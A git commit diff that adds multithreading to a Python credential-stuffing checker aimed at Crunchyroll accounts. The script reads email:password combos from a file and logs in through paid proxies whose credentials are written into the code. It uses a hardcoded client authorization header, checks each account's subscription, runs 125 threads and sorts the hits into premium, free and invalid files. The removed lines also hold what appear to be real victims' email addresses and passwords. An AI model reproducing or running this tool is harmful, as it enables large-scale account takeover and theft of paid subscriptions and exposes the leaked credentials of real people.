9faee6405372c16ec51fd9bad1875e0741836d23
Angel <77752887+aschezczdo@users.noreply.github.com>
2023-05-06 20:27:26 +0200

    Multithreading added

--- main.py
+++ main.py
@@ -1,82 +1,120 @@
 import requests
 import json
+from concurrent.futures import ThreadPoolExecutor
 
-from fake_useragent import UserAgent
-
-
+def process_account(account):
+    username, password = account
+    is_premium = check_account(username, password)
+    return (username, password, is_premium)
+def read_accounts_from_file(filename):
+    accounts = []
+    with open(filename, 'r') as f:
+        for line in f:
+            account = tuple(line.strip().split(':'))
+            accounts.append(account)
+    return accounts
 def check_account(username, password):
-    proxy = "gw.thunderproxies.net:5959:thunderIy42W8mW62G-dc-ANY:S3vPitDabzUK59z57B"
+
+    proxy = "gw.thunderproxies.net:5959:thunderpJ9pPsBU37O-dc-US:xBKtWmWTvzXUvS843F"
     ip, port, user, pwd = proxy.split(":")
     proxy_dict = {
         "http": f"http://{user}:{pwd}@{ip}:{port}",
         "https": f"http://{user}:{pwd}@{ip}:{port}"
     }
-    ua = UserAgent()
-    headers = {'User-Agent': ua.random}
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
+        "authorization": "Basic aHJobzlxM2F3dnNrMjJ1LXRzNWE6cHROOURteXRBU2Z6QjZvbXVsSzh6cUxzYTczVE1TY1k=",
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
 
     sess = requests.Session()
     sess.proxies.update(proxy_dict)
     sess.headers.update(headers)
 
     #testing proxies
-    ip_address = sess.get('https://api.ipify.org').text
-    print(f"Public IP address: {ip_address}")
+    #ip_address = sess.get('https://api.ipify.org').text
+    #print(f"Public IP address: {ip_address}")
 
-    data = sess.post(
-        url='https://api.crunchyroll.com/start_session.0.json',
-        data={
-            'version': '1.0',
-            'access_token': 'LNDJgOit5yaRIWN',
-            'device_type': 'com.crunchyroll.windows.desktop',
-            'device_id': 'AYS0igYFpmtb0h2RuJwvHPAhKK6RCYId',
-            'account': username,
-            'password': password
-        }
+    data = {
+        "grant_type": "password",
+        "scope": "offline_access",
+        "username": username,
+        "password": password
+    }
+
+    response = sess.post(
+        url="https://beta-api.crunchyroll.com/auth/v1/token",
+        data=data
     )
 
-    if "session_id" in data.text:
-        try:
-            cookies = json.loads(data.text)
-        except json.JSONDecodeError:
-            print(f"Error decoding JSON for username '{username}': {data.text}")
-            return False
-
-        session_id = cookies["data"]["session_id"]
-
-        data2 = sess.post(
-            url='https://api.crunchyroll.com/login.0.json',
-            data={
-                'account': username,
-                'password': password,
-                'session_id': session_id
-            }
-        )
-
-        try:
-            info = json.loads(data2.text)
-        except json.JSONDecodeError:
-            print(f"Error decoding JSON for username '{username}': {data2.text}")
-            return False
-
-        if info["code"] == "ok":
-            # If the account is valid, print premium status and expiration date
-            premium_status = info["data"]["user"]["premium"]
-            expiration_date = info["data"]["expires"]
-            print(f"Premium: {premium_status}, Expiration date: {expiration_date}")
-            return True
-        else:
-            return False
-    else:
+    try:
+        res_data = response.json()
+    except json.JSONDecodeError:
+        #print(f"Error decoding JSON for username '{username}': {response.text}") #prints if there's an error on the first request to access token. Prints API response to help debugging
         return False
 
+    if "access_token" in res_data:
+        access_token = res_data["access_token"]
+        headers["authorization"] = f"Bearer {access_token}"
+        sess.headers.update(headers)
 
-accounts = [
-    ("brunerlayne@gmail.com", "Baseball12$"),
-    ("santosgambasa@gmail.com", "pikachu05"),
-    ("liam.brauer@gmail.com", "50182004"),
-]
+        # Get user's external ID
+        user_data = sess.get("https://beta-api.crunchyroll.com/accounts/v1/me")
+        try:
+            user_data = user_data.json()
+            external_id = user_data["external_id"]
+        except (json.JSONDecodeError, KeyError):
+            #print(f"Error decoding JSON or getting external ID for username '{username}': {user_data.text}") #Prints if there's an error retrieving the userexternalID. Prints username associated with API + response
+            return False
 
-for account in accounts:
-    username, password = account
-    is_valid = check_account(username, password)
-    print(f"{username}: {'Valid' if is_valid else 'Invalid'}")
+        # Check subscription status
+        subscription_data = sess.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products") #sending get request to retrieve subscription details
+        try: #trying to parse the response data
+            subscription_data = subscription_data.json()
+            total = subscription_data["total"]
+        except (json.JSONDecodeError, KeyError):
+            #print(f"Error decoding JSON or getting subscription total for username '{username}': {subscription_data.text}") #prints if there's an error trying to parse response OR free account
+            return False
+
+        if total: #if total > 0 it contains a subscription
+            print(f"{username}: Valid")
+            return True
+        else: #else if total = 0 --> free subscription
+            print(f"{username}: Free Subscription")
+            return False
+    else: #if there aren't access token = invalid
+        print(f"{username}: Invalid")
+        return None
+
+accounts = read_accounts_from_file('combos.txt')
+
+# Print the number of accounts imported
+total_accounts = len(accounts)
+print("Total accounts imported:", total_accounts)
+
+max_threads = 125  # Adjust the number of threads based on your needs
+with ThreadPoolExecutor(max_threads) as executor:
+    results = executor.map(process_account, accounts)
+
+
+def save_to_file(filename, content):
+    with open(filename, 'a') as f:
+        f.write(content + "\n")
+
+for username, password, is_premium in results:
+    if is_premium is None:  # Check if the result is None (invalid)
+        print(f"{username}:{password}:Invalid")
+        save_to_file("invalid.txt", f"{username}:{password}:Invalid")
+    elif is_premium:
+        print(f"{username}:{password}:Premium")
+        save_to_file("premium.txt", f"{username}:{password}:Premium")
+    else:
+        print(f"{username}:{password}:Free")
+        save_to_file("free.txt", f"{username}:{password}:Free")
+
+
+
+
+
+
+
